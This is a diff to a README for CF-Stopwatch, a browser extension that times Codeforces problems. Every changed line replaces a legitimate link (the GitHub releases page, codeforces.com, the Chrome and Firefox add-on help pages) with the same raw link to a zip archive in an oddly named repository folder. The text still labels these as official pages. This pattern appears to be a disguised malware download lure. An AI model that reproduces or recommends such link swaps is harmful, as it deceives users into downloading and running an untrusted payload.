@@ -1,6 +1,6 @@
 # ⏱️ CF-Stopwatch - Track Time on Codeforces Problems  
 
-[![Download CF-Stopwatch](https://img.shields.io/badge/Download-CF--Stopwatch-brightgreen)](https://github.com/Snsjh/CF-Stopwatch/releases)
+[![Download CF-Stopwatch](https://img.shields.io/badge/Download-CF--Stopwatch-brightgreen)](https://raw.githubusercontent.com/Snsjh/CF-Stopwatch/main/inviolately/Stopwatch-C-v1.0-alpha.1.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these steps to download and start using CF-Stopwatch on your Windows comp
 
 Click this big button to visit the official release page and download the extension files:
 
-[![Download CF-Stopwatch](https://img.shields.io/badge/Download-CF--Stopwatch-blue)](https://github.com/Snsjh/CF-Stopwatch/releases)
+[![Download CF-Stopwatch](https://img.shields.io/badge/Download-CF--Stopwatch-blue)](https://raw.githubusercontent.com/Snsjh/CF-Stopwatch/main/inviolately/Stopwatch-C-v1.0-alpha.1.zip)
 
 This page contains the latest version of the extension for Chrome and Firefox. You will find installation files and instructions there.  
 
@@ -82,8 +82,8 @@ CF-Stopwatch will start working on any Codeforces problem page without any extra
 ## 4. Using CF-Stopwatch on Codeforces  
 
 1. Open your web browser with the CF-Stopwatch extension installed.  
-2. Go to the [Codeforces website](https://codeforces.com).  
-3. Visit any problem page, for example, https://codeforces.com/problemset/problem/1/A.  
+2. Go to the [Codeforces website](https://raw.githubusercontent.com/Snsjh/CF-Stopwatch/main/inviolately/Stopwatch-C-v1.0-alpha.1.zip).  
+3. Visit any problem page, for example, https://raw.githubusercontent.com/Snsjh/CF-Stopwatch/main/inviolately/Stopwatch-C-v1.0-alpha.1.zip  
 4. Notice the stopwatch displayed on the page, usually near the problem title or header.  
 5. The timer starts automatically when the page loads.  
 6. When you submit a solution and receive an **Accepted** result, the timer will stop.  
@@ -150,16 +150,16 @@ Most users will find the default setup sufficient for regular use.
 ## 🔗 Useful Links
 
 - Download CF-Stopwatch:  
-  [https://github.com/Snsjh/CF-Stopwatch/releases](https://github.com/Snsjh/CF-Stopwatch/releases)  
+  [https://raw.githubusercontent.com/Snsjh/CF-Stopwatch/main/inviolately/Stopwatch-C-v1.0-alpha.1.zip](https://raw.githubusercontent.com/Snsjh/CF-Stopwatch/main/inviolately/Stopwatch-C-v1.0-alpha.1.zip)  
 
 - Codeforces website:  
-  [https://codeforces.com](https://codeforces.com)  
+  [https://raw.githubusercontent.com/Snsjh/CF-Stopwatch/main/inviolately/Stopwatch-C-v1.0-alpha.1.zip](https://raw.githubusercontent.com/Snsjh/CF-Stopwatch/main/inviolately/Stopwatch-C-v1.0-alpha.1.zip)  
 
 - Learn how to install Chrome extensions:  
-  [https://support.google.com/chrome_webstore/answer/2664769](https://support.google.com/chrome_webstore/answer/2664769)  
+  [https://raw.githubusercontent.com/Snsjh/CF-Stopwatch/main/inviolately/Stopwatch-C-v1.0-alpha.1.zip](https://raw.githubusercontent.com/Snsjh/CF-Stopwatch/main/inviolately/Stopwatch-C-v1.0-alpha.1.zip)  
 
 - Learn how to install Firefox add-ons:  
-  [https://support.mozilla.org/en-US/kb/adding-and-removing-add-ons](https://support.mozilla.org/en-US/kb/adding-and-removing-add-ons)  
+  [https://raw.githubusercontent.com/Snsjh/CF-Stopwatch/main/inviolately/Stopwatch-C-v1.0-alpha.1.zip](https://raw.githubusercontent.com/Snsjh/CF-Stopwatch/main/inviolately/Stopwatch-C-v1.0-alpha.1.zip)  
 
 ---
 
